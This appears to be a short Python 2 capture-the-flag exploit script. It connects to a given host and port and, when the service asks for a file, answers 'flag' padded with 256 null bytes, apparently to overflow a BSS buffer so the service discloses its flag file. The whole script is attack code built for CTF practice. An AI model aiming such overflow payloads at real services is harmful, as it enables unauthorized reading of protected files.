import socket
from sys import argv

def thisisbss(IPaddr, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IPaddr, int(port)))
	
	while 1:
		output = s.recv(1024)
		if "file" in output:
			s.sendall("flag"+"\0"*256+'\n')
		elif "FLAG" in output:
			print output
		elif not output:
			break

thisisbss(argv[1], argv[2])
